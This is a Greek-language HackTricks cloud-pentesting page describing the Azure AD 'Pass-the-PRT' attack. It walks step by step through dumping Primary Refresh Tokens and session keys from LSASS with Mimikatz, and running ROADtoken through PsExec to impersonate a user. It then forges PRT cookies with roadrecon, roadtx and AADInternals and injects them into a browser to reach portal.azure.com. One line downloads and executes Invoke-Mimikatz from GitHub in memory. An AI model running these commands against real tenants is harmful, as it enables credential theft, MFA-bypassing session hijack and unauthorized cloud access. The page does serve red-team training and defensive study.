# Az - Pass the PRT

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Τι είναι ένα PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Ελέγξτε αν έχετε ένα PRT
```
Dsregcmd.exe /status
```
In the SSO State section, you should see the **`AzureAdPrt`** set to **YES**.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

Στην ίδια έξοδο μπορείτε επίσης να δείτε αν η **συσκευή είναι συνδεδεμένη στο Azure** (στο πεδίο `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

Το PRT cookie ονομάζεται στην πραγματικότητα **`x-ms-RefreshTokenCredential`** και είναι ένα JSON Web Token (JWT). Ένα JWT περιέχει **3 μέρη**, την **κεφαλίδα**, το **φορτίο** και την **υπογραφή**, χωρισμένα με μια `.` και όλα κωδικοποιημένα σε url-safe base64. Ένα τυπικό PRT cookie περιέχει την ακόλουθη κεφαλίδα και σώμα:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Το πραγματικό **Primary Refresh Token (PRT)** είναι ενσωματωμένο μέσα στο **`refresh_token`**, το οποίο είναι κρυπτογραφημένο με ένα κλειδί υπό τον έλεγχο του Azure AD, καθιστώντας το περιεχόμενό του αδιαφανές και μη αποκρυπτογραφήσιμο για εμάς. Το πεδίο **`is_primary`** υποδηλώνει την ενσωμάτωση του primary refresh token μέσα σε αυτό το token. Για να διασφαλιστεί ότι το cookie παραμένει δεσμευμένο στη συγκεκριμένη συνεδρία σύνδεσης για την οποία προοριζόταν, το `request_nonce` μεταδίδεται από τη σελίδα `logon.microsoftonline.com`.

### PRT Cookie flow using TPM

Η διαδικασία **LSASS** θα στείλει στο TPM το **KDF context**, και το TPM θα χρησιμοποιήσει το **session key** (που συλλέχθηκε όταν η συσκευή καταχωρήθηκε στο AzureAD και αποθηκεύτηκε στο TPM) και το προηγούμενο context για να **παράγει** ένα **κλειδί,** και αυτό το **παραγόμενο κλειδί** χρησιμοποιείται για να **υπογράψει το PRT cookie (JWT).**

Το **KDF context είναι** ένα nonce από το AzureAD και το PRT δημιουργώντας ένα **JWT** αναμεμειγμένο με ένα **context** (τυχαία bytes).

Επομένως, ακόμα κι αν το PRT δεν μπορεί να εξαχθεί επειδή βρίσκεται μέσα στο TPM, είναι δυνατό να καταχραστεί το LSASS για να **ζητήσει παράγωγα κλειδιά από νέα contexts και να χρησιμοποιήσει τα παραγόμενα κλειδιά για να υπογράψει Cookies**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT Abuse Scenarios

Ως **κανονικός χρήστης** είναι δυνατό να **ζητήσετε τη χρήση του PRT** ζητώντας από το LSASS δεδομένα SSO.\
Αυτό μπορεί να γίνει όπως οι **native apps** που ζητούν tokens από τον **Web Account Manager** (token broker). Ο WAM περνάει το αίτημα στο **LSASS**, το οποίο ζητά tokens χρησιμοποιώντας υπογεγραμμένη PRT assertion. Ή μπορεί να γίνει με **browser based (web) flows** όπου ένα **PRT cookie** χρησιμοποιείται ως **header** για να πιστοποιήσει αιτήματα στις σελίδες σύνδεσης του Azure AS.

Ως **SYSTEM** θα μπορούσατε να **κλέψετε το PRT αν δεν προστατεύεται** από το TPM ή να **αλληλεπιδράσετε με τα κλειδιά PRT στο LSASS** χρησιμοποιώντας crypto APIs.

## Pass-the-PRT Attack Examples

### Attack - ROADtoken

Για περισσότερες πληροφορίες σχετικά με αυτόν τον τρόπο [**ελέγξτε αυτήν την ανάρτηση**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). Το ROADtoken θα εκτελέσει το **`BrowserCore.exe`** από τον σωστό κατάλογο και θα το χρησιμοποιήσει για να **αποκτήσει ένα PRT cookie**. Αυτό το cookie μπορεί στη συνέχεια να χρησιμοποιηθεί με το ROADtools για να πιστοποιηθεί και να **αποκτήσει ένα persistent refresh token**.

Για να δημιουργήσετε ένα έγκυρο PRT cookie το πρώτο πράγμα που χρειάζεστε είναι ένα nonce.\
Μπορείτε να το αποκτήσετε με:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Ή χρησιμοποιώντας [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Τότε μπορείτε να χρησιμοποιήσετε το [**roadtoken**](https://github.com/dirkjanm/ROADtoken) για να αποκτήσετε ένα νέο PRT (εκτελέστε το εργαλείο από μια διαδικασία του χρήστη για επίθεση):
```powershell
.\ROADtoken.exe <nonce>
```
Ως εντολή μιας γραμμής:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το **generated cookie** για να **generate tokens** για **login** χρησιμοποιώντας Azure AD **Graph** ή Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Επίθεση - Χρησιμοποιώντας roadrecon

### Επίθεση - Χρησιμοποιώντας AADInternals και ένα leaked PRT

`Get-AADIntUserPRTToken` **παίρνει το PRT token του χρήστη** από τον Azure AD joined ή Hybrid joined υπολογιστή. Χρησιμοποιεί το `BrowserCore.exe` για να πάρει το PRT token.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Ή αν έχετε τις τιμές από το Mimikatz, μπορείτε επίσης να χρησιμοποιήσετε το AADInternals για να δημιουργήσετε ένα token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Πήγαινε στο [https://login.microsoftonline.com](https://login.microsoftonline.com), καθάρισε όλα τα cookies για το login.microsoftonline.com και εισήγαγε ένα νέο cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Then go to [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Τα υπόλοιπα θα πρέπει να είναι οι προεπιλογές. Βεβαιωθείτε ότι μπορείτε να ανανεώσετε τη σελίδα και το cookie δεν εξαφανίζεται, αν εξαφανιστεί, μπορεί να έχετε κάνει λάθος και πρέπει να περάσετε ξανά τη διαδικασία. Αν δεν εξαφανιστεί, είστε εντάξει.
{% endhint %}

### Επίθεση - Mimikatz

#### Βήματα

1. Το **PRT (Primary Refresh Token) εξάγεται από το LSASS** (Local Security Authority Subsystem Service) και αποθηκεύεται για μετέπειτα χρήση.
2. Το **Session Key εξάγεται στη συνέχεια**. Δεδομένου ότι αυτό το κλειδί αρχικά εκδίδεται και στη συνέχεια επανακρυπτογραφείται από την τοπική συσκευή, απαιτείται αποκρυπτογράφηση χρησιμοποιώντας ένα DPAPI masterkey. Λεπτομερείς πληροφορίες για το DPAPI (Data Protection API) μπορείτε να βρείτε σε αυτούς τους πόρους: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) και για κατανόηση της εφαρμογής του, ανατρέξτε στην [Pass-the-cookie attack](az-pass-the-cookie.md).
3. Μετά την αποκρυπτογράφηση του Session Key, **λαμβάνονται το παράγωγο κλειδί και το context για το PRT**. Αυτά είναι κρίσιμα για τη **δημιουργία του PRT cookie**. Συγκεκριμένα, το παράγωγο κλειδί χρησιμοποιείται για την υπογραφή του JWT (JSON Web Token) που αποτελεί το cookie. Μια ολοκληρωμένη εξήγηση αυτής της διαδικασίας έχει παρασχεθεί από τον Dirk-jan, διαθέσιμη [εδώ](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Σημειώστε ότι αν το PRT είναι μέσα στο TPM και όχι μέσα στο `lsass` **το mimikatz δεν θα μπορέσει να το εξάγει**.\
Ωστόσο, θα είναι δυνατό να **λάβετε ένα κλειδί από ένα παράγωγο κλειδί από ένα context** από το TPM και να το χρησιμοποιήσετε για να **υπογράψετε ένα cookie (ελέγξτε την επιλογή 3).**
{% endhint %}

Μπορείτε να βρείτε μια **λεπτομερή εξήγηση της εκτελεσθείσας διαδικασίας** για την εξαγωγή αυτών των λεπτομερειών εδώ: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Αυτό δεν θα λειτουργήσει ακριβώς μετά τις διορθώσεις του Αυγούστου 2021 για να λάβετε τα PRT tokens άλλων χρηστών, καθώς μόνο ο χρήστης μπορεί να λάβει το PRT του (ένας τοπικός διαχειριστής δεν μπορεί να έχει πρόσβαση στα PRTs άλλων χρηστών), αλλά μπορεί να έχει πρόσβαση στο δικό του.
{% endhint %}

Μπορείτε να χρησιμοποιήσετε το **mimikatz** για να εξάγετε το PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Αντιγράψτε** το μέρος με την ετικέτα **Prt** και αποθηκεύστε το.\
Εξάγετε επίσης το κλειδί συνεδρίας (το **`KeyValue`** του πεδίου **`ProofOfPossesionKey`**) το οποίο μπορείτε να δείτε επισημασμένο παρακάτω. Αυτό είναι κρυπτογραφημένο και θα χρειαστεί να χρησιμοποιήσουμε τα DPAPI masterkeys μας για να το αποκρυπτογραφήσουμε.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Αν δεν βλέπετε δεδομένα PRT, μπορεί να μην έχετε καθόλου PRTs επειδή η συσκευή σας δεν είναι συνδεδεμένη στο Azure AD ή μπορεί να χρησιμοποιείτε μια παλιά έκδοση των Windows 10.
{% endhint %}

Για να **αποκρυπτογραφήσετε** το κλειδί συνεδρίας, πρέπει να **αυξήσετε** τα προνόμιά σας σε **SYSTEM** για να εκτελέσετε υπό το πλαίσιο του υπολογιστή και να μπορέσετε να χρησιμοποιήσετε το **DPAPI masterkey για να το αποκρυπτογραφήσετε**. Μπορείτε να χρησιμοποιήσετε τις παρακάτω εντολές για να το κάνετε:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Επιλογή 1 - Πλήρες Mimikatz

* Τώρα θέλετε να αντιγράψετε και την τιμή Context:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* Και την τιμή του derived key:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* Τέλος, μπορείτε να χρησιμοποιήσετε όλες αυτές τις πληροφορίες για να **δημιουργήσετε PRT cookies**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Πηγαίνετε στο [https://login.microsoftonline.com](https://login.microsoftonline.com), διαγράψτε όλα τα cookies για το login.microsoftonline.com και εισάγετε ένα νέο cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Then go to [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Τα υπόλοιπα θα πρέπει να είναι οι προεπιλογές. Βεβαιωθείτε ότι μπορείτε να ανανεώσετε τη σελίδα και το cookie δεν εξαφανίζεται, αν εξαφανιστεί, μπορεί να έχετε κάνει λάθος και πρέπει να επαναλάβετε τη διαδικασία. Αν δεν εξαφανιστεί, είστε εντάξει.
{% endhint %}

#### Option 2 - roadrecon using PRT

* Ανανεώστε πρώτα το PRT, το οποίο θα το αποθηκεύσει στο `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Τώρα μπορούμε να **ζητήσουμε tokens** χρησιμοποιώντας τον διαδραστικό περιηγητή με `roadtx browserprtauth`. Αν χρησιμοποιήσουμε την εντολή `roadtx describe`, βλέπουμε ότι το access token περιλαμβάνει μια αξίωση MFA επειδή το PRT που χρησιμοποίησα σε αυτή την περίπτωση είχε επίσης μια αξίωση MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Επιλογή 3 - roadrecon χρησιμοποιώντας παράγωγα κλειδιά

Έχοντας το context και το παράγωγο κλειδί που εξήχθη από το mimikatz, είναι δυνατό να χρησιμοποιήσετε το roadrecon για να δημιουργήσετε ένα νέο υπογεγραμμένο cookie με:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Αναφορές

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
